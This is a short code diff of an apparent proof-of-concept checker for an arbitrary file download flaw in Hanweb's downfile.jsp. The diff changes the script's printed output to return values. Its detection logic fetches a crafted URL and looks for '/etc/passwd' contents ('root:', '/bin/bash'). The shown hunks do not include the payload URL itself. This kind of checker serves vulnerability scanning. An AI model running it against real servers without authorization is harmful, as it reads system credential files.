@@ -8,8 +8,8 @@ description: 文件/vc/vc/columncount/downfile.jsp中,参数filename存在任意
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class hanweb_downfile_filedownload_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class hanweb_downfile_filedownload_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"root:" in req.text and r"/bin/bash" in req.text:
-                cprint("[+]存在大汉downfile.jsp 任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在大汉downfile.jsp 任意文件下载漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = hanweb_downfile_filedownload_BaseVerify(sys.argv[1])
     testVuln.run()
